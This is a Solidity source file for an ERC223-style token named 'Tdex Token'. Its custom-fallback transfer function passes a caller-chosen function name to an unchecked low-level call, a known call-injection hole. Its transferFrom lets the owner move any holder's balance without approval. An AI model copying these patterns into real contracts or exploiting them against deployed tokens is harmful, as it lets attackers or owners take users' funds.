pragma solidity ^0.4.9;
 

contract SafeMath {
    uint256 constant public MAX_UINT256 =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;

    function safeAdd(uint256 x, uint256 y) pure internal returns (uint256 z) {
        if (x > MAX_UINT256 - y) assert(false);
        return x + y;
    }

    function safeSub(uint256 x, uint256 y) pure internal returns (uint256 z) {
        if (x < y) assert(false);
        return x - y;
    }

    function safeMul(uint256 x, uint256 y) pure internal returns (uint256 z) {
        if (y == 0) return 0;
        if (x > MAX_UINT256 / y) assert(false);
        return x * y;
    }
}

contract ContractReceiver {
    function tokenFallback(address _from, uint _value, bytes _data) public;
}
 
contract TD is SafeMath {
    
    event Transfer(address indexed _from, address indexed _to, uint256 _value, bytes _data);

    mapping(address => uint) balances;
  
    string public name    = "Tdex Token";
    string public symbol  = "TD";
    uint8 public decimals = 10;
    uint256 public totalSupply;
	address owner;
  
    function TD(uint256 _supply, string _name, string _symbol, uint8 _decimals) public
    {
        if (_supply == 0) _supply = 10000000000;

        owner = msg.sender;
        balances[owner] = _supply;
        totalSupply = balances[owner];

        name = _name;
        decimals = _decimals;
        symbol = _symbol;
    }
  
  
  // Function to access name of token .
  function name() public constant returns (string _name) {
      return name;
  }
  // Function to access symbol of token .
  function symbol() public constant returns (string _symbol) {
      return symbol;
  }
  // Function to access decimals of token .
  function decimals() public constant returns (uint8 _decimals) {
      return decimals;
  }
  // Function to access total supply of tokens .
  function totalSupply() public constant returns (uint256 _totalSupply) {
      return totalSupply;
  }
  
  
  // Function that is called when a user or another contract wants to transfer funds .
  function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
      
    if(isContract(_to)) {
        if (balanceOf(msg.sender) < _value) assert(false);
        balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
        balances[_to] = safeAdd(balanceOf(_to), _value);
        assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
        emit Transfer(msg.sender, _to, _value, _data);
        return true;
    }
    else {
        return transferToAddress(_to, _value, _data);
    }
}
  

  // Function that is called when a user or another contract wants to transfer funds .
  function transfer(address _to, uint _value, bytes _data) public returns (bool success) {
      
    if(isContract(_to)) {
        return transferToContract(_to, _value, _data);
    }
    else {
        return transferToAddress(_to, _value, _data);
    }
}
  
    // Standard function transfer similar to ERC20 transfer with no _data .
    // Added due to backwards compatibility reasons .
    function transfer(address _to, uint _value) public returns (bool success) {

        //standard function transfer similar to ERC20 transfer with no _data
        //added due to backwards compatibility reasons
        bytes memory empty;
        if(isContract(_to)) {
            return transferToContract(_to, _value, empty);
        }
        else {
            return transferToAddress(_to, _value, empty);
        }
    }

	//assemble the given address bytecode. If bytecode exists then the _addr is a contract.
    function isContract(address _addr) private view returns (bool is_contract) {
        uint length;
        assembly {
        //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return (length>0);
    }

	//function that is called when transaction target is an address
    function transferToAddress(address _to, uint _value, bytes _data) private returns (bool success) {
        if (balanceOf(msg.sender) < _value) assert(false);
        balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
        balances[_to] = safeAdd(balanceOf(_to), _value);
        emit Transfer(msg.sender, _to, _value, _data);
        return true;
    }
  
  //function that is called when transaction target is a contract
    function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) {
        if (balanceOf(msg.sender) < _value) assert(false);
        balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
        balances[_to] = safeAdd(balanceOf(_to), _value);
        ContractReceiver receiver = ContractReceiver(_to);
        receiver.tokenFallback(msg.sender, _value, _data);
        emit Transfer(msg.sender, _to, _value, _data);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public {
        if(!isOwner()) return;

        if (balances[_from] < _value) return;    
        if (safeAdd(balances[_to] , _value) < balances[_to]) return;

        balances[_from] = safeSub(balances[_from],_value);
        balances[_to] = safeAdd(balances[_to],_value);
        /* Notifiy anyone listening that this transfer took place */
        bytes memory empty;
        emit Transfer(_from, _to, _value,empty);
    }

	function isOwner() public view  
    returns (bool)  {
        return owner == msg.sender;
    }
	
    function balanceOf(address _owner) public constant returns (uint balance) {
        return balances[_owner];
    }
}